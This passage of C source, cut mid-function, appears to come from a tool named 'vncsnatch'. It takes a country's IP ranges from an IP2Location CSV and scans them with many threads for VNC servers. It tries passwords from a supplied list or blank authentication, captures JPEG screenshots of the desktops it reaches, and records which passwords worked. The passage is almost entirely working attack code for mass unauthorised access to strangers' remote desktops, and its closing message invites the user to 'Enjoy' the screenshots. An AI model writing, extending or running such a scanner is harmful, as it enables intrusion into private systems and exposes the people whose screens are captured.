  ctx.allow_blank = allow_blank;
  ctx.jpeg_quality = jpeg_quality;
  ctx.rect_x = rect_x;
  ctx.rect_y = rect_y;
  ctx.rect_w = rect_w;
  ctx.rect_h = rect_h;
  ctx.metadata_dir = metadata_dir;
  ctx.country_code = country_code;
  ctx.country_name = country_name;
  ctx.ping_available = has_required_capabilities() ? 1 : 0;
  ctx.spinner_index = 0;
  ctx.ui_initialized = 0;
  ctx.start_time = time(NULL);
  ctx.allow_cidrs = allow_cidrs;
  ctx.allow_cidr_count = allow_cidr_count;
  ctx.deny_cidrs = deny_cidrs;
  ctx.deny_cidr_count = deny_cidr_count;
  ctx.auth_delay_ms = auth_delay_ms;
  ctx.results_file = results_file;
  ctx.results_jsonl = results_jsonl;
  pthread_mutex_init(&ctx.results_mutex, NULL);
  ctx.port_count = port_count;
  ctx.resume_enabled = resume_enabled;
  ctx.resume_offset = resume_offset;
  ctx.rate_limit = rate_limit;
  for (size_t i = 0; i < port_count &&
                     i < (sizeof(ctx.ports) / sizeof(ctx.ports[0]));
       i++) {
    ctx.ports[i] = ports[i];
  }
  pthread_mutex_init(&ctx.range_mutex, NULL);
  pthread_mutex_init(&ctx.rate_mutex, NULL);
  pthread_mutex_init(&ctx.checkpoint_mutex, NULL);
  pthread_mutex_init(&ctx.stats_mutex, NULL);
  pthread_mutex_init(&ctx.print_mutex, NULL);
  gettimeofday(&ctx.last_print, NULL);
  if (ctx.resume_enabled) {
    gettimeofday(&ctx.last_checkpoint, NULL);
  }

  if (apply_resume_offset(&ctx) != 0) {
    printf(COLOR_YELLOW "Resume offset exceeds total IPs.\n" COLOR_RESET);
    pthread_mutex_destroy(&ctx.range_mutex);
    pthread_mutex_destroy(&ctx.rate_mutex);
    pthread_mutex_destroy(&ctx.checkpoint_mutex);
    pthread_mutex_destroy(&ctx.stats_mutex);
    pthread_mutex_destroy(&ctx.print_mutex);
    free(ranges);
    return 0;
  }

  int worker_count = get_worker_count(workers);
  ctx.worker_count = worker_count;
  if (!quiet) {
    printf("Using %d worker threads\n", worker_count);
  }
  update_progress(&ctx, 1);

  pthread_t *threads = calloc((size_t)worker_count, sizeof(*threads));
  if (!threads) {
    free(ranges);
    free(country_name);
    return 0;
  }

  int started_workers = 0;
  for (int i = 0; i < worker_count; i++) {
    if (pthread_create(&threads[i], NULL, scan_worker, &ctx) != 0) {
      break;
    }
    started_workers++;
  }
  for (int i = 0; i < started_workers; i++) {
    pthread_join(threads[i], NULL);
  }

  update_progress(&ctx, 1);
  checkpoint_update(&ctx, 1);
  if (!quiet && !verbose) {
    printf("\n");
  }
  printf("Finished checking %llu addresses, VNCs found %llu (no auth %llu), screenshots %llu\n",
         (unsigned long long)ctx.scanned_ips,
         (unsigned long long)ctx.vnc_found,
         (unsigned long long)ctx.vnc_noauth,
         (unsigned long long)ctx.screenshots);

  pthread_mutex_destroy(&ctx.range_mutex);
  pthread_mutex_destroy(&ctx.rate_mutex);
  pthread_mutex_destroy(&ctx.checkpoint_mutex);
  pthread_mutex_destroy(&ctx.stats_mutex);
  pthread_mutex_destroy(&ctx.print_mutex);
  pthread_mutex_destroy(&ctx.results_mutex);
  free(threads);
  free(ranges);
  free(country_name);
  return (int)ctx.screenshots;
}

char *file_location = NULL;
char *country_code = NULL;
#ifdef USE_VNCSNAPSHOT
static int run_vncsnapshot(const char *ip_addr, int port, int timeout_sec) {
  char target[48];
  char output[32];
  char *argv[] = {"vncsnapshot", "-allowblank", target, output, NULL};
  time_t start_time = time(NULL);

  if (snprintf(target, sizeof(target), "%s::%d", ip_addr, port) >=
      (int)sizeof(target)) {
    return -1;
  }
  if (snprintf(output, sizeof(output), "%s.jpg", ip_addr) >= (int)sizeof(output)) {
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    return -1;
  }
  if (pid == 0) {
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
      dup2(devnull, STDOUT_FILENO);
      dup2(devnull, STDERR_FILENO);
      if (devnull > STDERR_FILENO) {
        close(devnull);
      }
    }
    execvp(argv[0], argv);
    _exit(127);
  }

  for (;;) {
    int status = 0;
    pid_t wait_result = waitpid(pid, &status, WNOHANG);
    if (wait_result == pid) {
      if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 0;
      }
      return -1;
    }
    if (wait_result == 0) {
      if (time(NULL) - start_time >= timeout_sec) {
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
        return -1;
      }
      usleep(100000);
      continue;
    }
    if (wait_result < 0 && errno == EINTR) {
      continue;
    }
    return -1;
  }
}
#endif

static int capture_snapshot(const char *ip_addr, int port, int timeout_sec,
                            int verbose, const char *password, int allow_blank,
                            int jpeg_quality, int rect_x, int rect_y,
                            int rect_w, int rect_h) {
  char output[32];
  if (snprintf(output, sizeof(output), "%s.jpg", ip_addr) >=
      (int)sizeof(output)) {
    return -1;
  }
#ifdef USE_VNCSNAPSHOT
  (void)verbose;
  (void)password;
  (void)allow_blank;
  (void)jpeg_quality;
  (void)rect_x;
  (void)rect_y;
  (void)rect_w;
  (void)rect_h;
  return run_vncsnapshot(ip_addr, port, timeout_sec);
#else
  return vncgrab_snapshot(ip_addr, port, password, output, timeout_sec,
                          allow_blank != 0, jpeg_quality, rect_x, rect_y,
                          rect_w, rect_h, verbose != 0);
#endif
}

/**
 * Signal handler for cleaning up resources on SIGINT.
 *
 * @param signum The signal number.
 */
void handle_sigint(int signum) {
  fprintf(stderr,
          COLOR_RED "\nInterrupt received. Cleaning up...\n" COLOR_RESET);
  if (file_location) {
    rl_clear_history();
    free(file_location);
  }
  if (country_code) {
    free(country_code);
  }
  exit(1);
}

/**
 * Main function to execute the program.
 *
 * @return Exit status of the program.
 */
int main(int argc, char **argv) {
  int opt;
  int option_index = 0;
  int worker_override = 0;
  int snapshot_timeout = 60;
  int verbose = 0;
  int quiet = 0;
  int resume_enabled = 0;
  int rate_limit = 0;
  char *password = NULL;
  char *password_file = NULL;
  const char *metadata_dir = "metadata";
  int allow_blank = 0;
  int jpeg_quality = 100;
  int rect_x = -1;
  int rect_y = -1;
  int rect_w = 0;
  int rect_h = 0;
  int auth_delay_ms = 0;
  char *allow_cidr_arg = NULL;
  char *deny_cidr_arg = NULL;
  char *results_path = NULL;
  int ports[64] = {5900, 5901};
  size_t port_count = 2;
  static struct option long_options[] = {
      {"country", required_argument, 0, 'c'},
      {"file", required_argument, 0, 'f'},
      {"workers", required_argument, 0, 'w'},
      {"timeout", required_argument, 0, 't'},
      {"ports", required_argument, 0, 'p'},
      {"resume", no_argument, 0, 'r'},
      {"rate", required_argument, 0, 'R'},
      {"password", required_argument, 0, 'P'},
      {"password-file", required_argument, 0, 'F'},
      {"metadata-dir", required_argument, 0, 'M'},
      {"allow-cidr", required_argument, 0, 'A'},
      {"deny-cidr", required_argument, 0, 'D'},
      {"delay-attempts", required_argument, 0, 'T'},
      {"results", required_argument, 0, 'o'},
      {"allowblank", no_argument, 0, 'b'},
      {"ignoreblank", no_argument, 0, 'B'},
      {"quality", required_argument, 0, 'Q'},
      {"rect", required_argument, 0, 'x'},
      {"verbose", no_argument, 0, 'v'},
      {"quiet", no_argument, 0, 'q'},
      {"help", no_argument, 0, 'h'},
      {0, 0, 0, 0},
  };

  // handle ctrl-c
  signal(SIGINT, handle_sigint);
  // print ansi banner
  //
  print_banner();

  if (!has_required_capabilities()) {
    fprintf(
        stderr, COLOR_RED
        "Warning!:\nThe program does not have the required "
        "capabilities or is not run by root.\n To set capabilities use:\n - "
        "sudo setcap cap_net_admin,cap_net_raw=eip vncsnatch\n\n" COLOR_RESET);
    fprintf(stderr, COLOR_RED "Without this, the IP check will be slow as we "
                              "cannot just ping it.\n\n" COLOR_RESET);
  }
#ifdef USE_VNCSNAPSHOT
  if (!is_command_in_path("vncsnapshot")) {
    fprintf(stderr, COLOR_RED
            "Error: vncsnapshot is not in the PATH. Please install it "
            "and ensure it is accessible.\n" COLOR_RESET);
    free(country_code);
    free(password);
    return 1;
  }
#endif
  while ((opt = getopt_long(argc, argv, "c:f:w:t:p:rR:P:F:M:A:D:T:o:bBQ:x:vqh",
                            long_options, &option_index)) != -1) {
    switch (opt) {
    case 'c':
      if (country_code) {
        free(country_code);
      }
      country_code = strdup(optarg);
      break;
    case 'f':
      if (file_location) {
        free(file_location);
      }
      file_location = strdup(optarg);
      break;
    case 'w': {
      char *end = NULL;
      long value = strtol(optarg, &end, 10);
      if (!end || *end != '\0' || value <= 0 || value > 256) {
        fprintf(stderr, COLOR_RED "Invalid worker count.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        return 1;
      }
      worker_override = (int)value;
      break;
    }
    case 't': {
      char *end = NULL;
      long value = strtol(optarg, &end, 10);
      if (!end || *end != '\0' || value <= 0 || value > 3600) {
        fprintf(stderr, COLOR_RED "Invalid timeout value.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        return 1;
      }
      snapshot_timeout = (int)value;
      break;
    }
    case 'p': {
      int parsed = parse_ports(optarg, ports, sizeof(ports) / sizeof(ports[0]));
      if (parsed < 0) {
        fprintf(stderr, COLOR_RED "Invalid ports list.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        return 1;
      }
      port_count = (size_t)parsed;
      break;
    }
    case 'r':
      resume_enabled = 1;
      break;
    case 'R': {
      char *end = NULL;
      long value = strtol(optarg, &end, 10);
      if (!end || *end != '\0' || value <= 0 || value > 1000000) {
        fprintf(stderr, COLOR_RED "Invalid rate limit.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        return 1;
      }
      rate_limit = (int)value;
      break;
    }
    case 'P':
      if (password) {
        free(password);
      }
      password = strdup(optarg);
      if (!password) {
        fprintf(stderr, COLOR_RED "Out of memory.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        return 1;
      }
      break;
    case 'F':
      if (password_file) {
        free(password_file);
      }
      password_file = strdup(optarg);
      if (!password_file) {
        fprintf(stderr, COLOR_RED "Out of memory.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        free(password);
        return 1;
      }
      break;
    case 'M':
      metadata_dir = optarg;
      break;
    case 'A':
      if (allow_cidr_arg) {
        free(allow_cidr_arg);
      }
      allow_cidr_arg = strdup(optarg);
      if (!allow_cidr_arg) {
        fprintf(stderr, COLOR_RED "Out of memory.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        free(password);
        free(password_file);
        return 1;
      }
      break;
    case 'D':
      if (deny_cidr_arg) {
        free(deny_cidr_arg);
      }
      deny_cidr_arg = strdup(optarg);
      if (!deny_cidr_arg) {
        fprintf(stderr, COLOR_RED "Out of memory.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        free(password);
        free(password_file);
        free(allow_cidr_arg);
        return 1;
      }
      break;
    case 'T': {
      char *end = NULL;
      long value = strtol(optarg, &end, 10);
      if (!end || *end != '\0' || value < 0 || value > 600000) {
        fprintf(stderr, COLOR_RED "Invalid delay value.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        free(password);
        free(password_file);
        free(allow_cidr_arg);
        free(deny_cidr_arg);
        return 1;
      }
      auth_delay_ms = (int)value;
      break;
    }
    case 'o':
      if (results_path) {
        free(results_path);
      }
      results_path = strdup(optarg);
      if (!results_path) {
        fprintf(stderr, COLOR_RED "Out of memory.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        free(password);
        free(password_file);
        free(allow_cidr_arg);
        free(deny_cidr_arg);
        return 1;
      }
      break;
    case 'b':
      allow_blank = 1;
      break;
    case 'B':
      allow_blank = 0;
      break;
    case 'Q': {
      char *end = NULL;
      long value = strtol(optarg, &end, 10);
      if (!end || *end != '\0' || value < 1 || value > 100) {
        fprintf(stderr, COLOR_RED "Invalid JPEG quality.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        free(password);
        return 1;
      }
      jpeg_quality = (int)value;
      break;
    }
    case 'x':
      if (parse_rect(optarg, &rect_x, &rect_y, &rect_w, &rect_h) != 0) {
        fprintf(stderr, COLOR_RED "Invalid rect spec.\n" COLOR_RESET);
        free(country_code);
        free(file_location);
        free(password);
        return 1;
      }
      break;
    case 'v':
      verbose = 1;
      break;
    case 'q':
      quiet = 1;
      break;
    case 'h':
      print_usage(argv[0]);
      free(country_code);
      free(file_location);
      return 0;
    default:
      print_usage(argv[0]);
      free(country_code);
      free(file_location);
      return 1;
    }
  }

  if (!country_code) {
    char input[8];
    printf("Please enter the country code to filter by (e.g., AU): ");
    if (fgets(input, sizeof(input), stdin) == NULL) {
      fprintf(stderr, COLOR_RED "Error reading country code.\n" COLOR_RESET);
      return 1;
    }
    input[strcspn(input, "\n")] = '\0';
    country_code = strdup(input);
    if (!country_code) {
      fprintf(stderr, COLOR_RED "Out of memory.\n" COLOR_RESET);
      return 1;
    }
  }

  if (strlen(country_code) != 2) {
    fprintf(stderr, COLOR_RED "Country code must be 2 letters.\n" COLOR_RESET);
    free(country_code);
    free(file_location);
    return 1;
  }

  if (!file_location) {
    printf("Please enter full file path to the CSV file from "
           "IP2Location.com.\nIt can be downloaded from "
           "https://download.ip2location.com/lite/"
           "\n\nFull path: ");
    file_location = readline("==>");
  }
  if (file_location == NULL || strlen(file_location) == 0) {
    fprintf(stderr, COLOR_RED "Error reading user input.\n" COLOR_RESET);
    if (file_location)
      free(file_location);
    if (country_code)
      free(country_code);
    return 1;
  }

  char *cleaned_file_location = clean_file_location(file_location);
  if (!cleaned_file_location) {
    fprintf(stderr, COLOR_RED "Error cleaning file location.\n" COLOR_RESET);
    if (file_location)
      free(file_location);
    if (country_code)
      free(country_code);
    return 1;
  }

  if (quiet && verbose) {
    quiet = 0;
  }

  if (!quiet) {
    printf("Preparing filters...\n");
  }

  cidr_t *allow_cidrs = NULL;
  size_t allow_cidr_count = 0;
  if (allow_cidr_arg) {
    if (!quiet) {
      printf(" - Loading allow CIDRs... ");
      fflush(stdout);
    }
    if (parse_cidr_list(allow_cidr_arg, &allow_cidrs, &allow_cidr_count) != 0) {
      if (!quiet) {
        printf("failed\n");
      }
      fprintf(stderr, COLOR_RED "Invalid allow CIDR list.\n" COLOR_RESET);
      free(country_code);
      free(file_location);
      free(password);
      free(password_file);
      free(allow_cidr_arg);
      free(deny_cidr_arg);
      return 1;
    }
    if (!quiet) {
      printf("done (%zu)\n", allow_cidr_count);
    }
  }

  cidr_t *deny_cidrs = NULL;
  size_t deny_cidr_count = 0;
  if (deny_cidr_arg) {
    if (!quiet) {
      printf(" - Loading deny CIDRs... ");
      fflush(stdout);
    }
    if (parse_cidr_list(deny_cidr_arg, &deny_cidrs, &deny_cidr_count) != 0) {
      if (!quiet) {
        printf("failed\n");
      }
      fprintf(stderr, COLOR_RED "Invalid deny CIDR list.\n" COLOR_RESET);
      free(country_code);
      free(file_location);
      free(password);
      free(password_file);
      free(allow_cidr_arg);
      free(deny_cidr_arg);
      free(allow_cidrs);
      return 1;
    }
    if (!quiet) {
      printf("done (%zu)\n", deny_cidr_count);
    }
  }

  FILE *results_file = NULL;
  int results_jsonl = 0;
  if (results_path) {
    if (!quiet) {
      printf(" - Opening results file... ");
      fflush(stdout);
    }
    size_t len = strlen(results_path);
    if (len >= 6 && strcmp(results_path + len - 6, ".jsonl") == 0) {
      results_jsonl = 1;
    } else if (len >= 5 && strcmp(results_path + len - 5, ".json") == 0) {
      results_jsonl = 1;
    }
    results_file = fopen(results_path, "w");
    if (!results_file) {
      if (!quiet) {
        printf("failed\n");
      }
      fprintf(stderr, COLOR_RED "Failed to open results file.\n" COLOR_RESET);
      free(country_code);
      free(file_location);
      free(password);
      free(password_file);
      free(allow_cidr_arg);
      free(deny_cidr_arg);
      free(allow_cidrs);
      free(deny_cidrs);
      return 1;
    }
    if (!results_jsonl) {
      fprintf(results_file,
              "ip,port,country_code,country_name,online,auth_required,auth_success,password_used,screenshot_saved\n");
    }
    if (!quiet) {
      printf("done\n");
    }
  }

  password_list_t passwords = {0};
  if (password_file) {
    if (!quiet) {
      printf(" - Loading password file... ");
      fflush(stdout);
    }
    if (load_password_file(&passwords, password_file) != 0) {
      if (!quiet) {
        printf("failed\n");
      }
      fprintf(stderr, COLOR_RED "Failed to read password file.\n" COLOR_RESET);
      free(country_code);
      free(file_location);
      free(password);
      free(password_file);
      free(allow_cidr_arg);
      free(deny_cidr_arg);
      free(allow_cidrs);
      free(deny_cidrs);
      if (results_file) {
        fclose(results_file);
      }
      return 1;
    }
    if (!quiet) {
      printf("done (%zu)\n", passwords.count);
    }
  }
  if (password) {
    if (!quiet) {
      printf(" - Adding single password... ");
      fflush(stdout);
    }
    if (add_password(&passwords, password) != 0) {
      if (!quiet) {
        printf("failed\n");
      }
      fprintf(stderr, COLOR_RED "Failed to store password.\n" COLOR_RESET);
      free(country_code);
      free(file_location);
      free(password);
      free(password_file);
      free(allow_cidr_arg);
      free(deny_cidr_arg);
      free(allow_cidrs);
      free(deny_cidrs);
      if (results_file) {
        fclose(results_file);
      }
      free_password_list(&passwords);
      return 1;
    }
    if (!quiet) {
      printf("done\n");
    }
  }

  const char *metadata_dir_used = NULL;
  if (metadata_dir && metadata_dir[0] != '\0') {
    if (!quiet) {
      printf(" - Preparing metadata dir... ");
      fflush(stdout);
    }
    if (mkdir(metadata_dir, 0755) != 0 && errno != EEXIST) {
      if (!quiet) {
        printf("failed\n");
      }
      fprintf(stderr, COLOR_RED "Failed to create metadata directory.\n" COLOR_RESET);
      free(country_code);
      free(file_location);
      free(password);
      free(password_file);
      free(allow_cidr_arg);
      free(deny_cidr_arg);
      free(allow_cidrs);
      free(deny_cidrs);
      if (results_file) {
        fclose(results_file);
      }
      free_password_list(&passwords);
      return 1;
    }
    metadata_dir_used = metadata_dir;
    if (!quiet) {
      printf("done\n");
    }
  }

  uint64_t resume_offset = 0;
  if (resume_enabled) {
    if (read_resume_offset(".line", &resume_offset) != 0) {
      fprintf(stderr, COLOR_YELLOW
                      "Resume requested but no valid .line found. Starting from 0.\n"
                      COLOR_RESET);
      resume_offset = 0;
    } else {
      printf("Resuming from checkpoint: %llu\n",
             (unsigned long long)resume_offset);
    }
  }

  int num_shots = parse_and_check_ips(cleaned_file_location, country_code,
                                      worker_override, snapshot_timeout,
                                      verbose, quiet, ports, port_count,
                                      resume_enabled, resume_offset,
                                      rate_limit, &passwords, allow_blank,
                                      jpeg_quality, rect_x, rect_y, rect_w,
                                      rect_h, metadata_dir_used, allow_cidrs,
                                      allow_cidr_count, deny_cidrs,
                                      deny_cidr_count, auth_delay_ms,
                                      results_file, results_jsonl);
  printf(COLOR_GREEN
         "\nAll done. Enjoy %d new screenshots in this folder\n" COLOR_RESET,
         num_shots);

  if (file_location)
    free(file_location);
  if (cleaned_file_location)
    free(cleaned_file_location);
  if (country_code)
    free(country_code);
  if (password)
    free(password);
  if (password_file)
    free(password_file);
  if (allow_cidr_arg)
    free(allow_cidr_arg);
  if (deny_cidr_arg)
    free(deny_cidr_arg);
  free(allow_cidrs);
  free(deny_cidrs);
  if (results_file)
    fclose(results_file);
  free_password_list(&passwords);
  return 0;
}
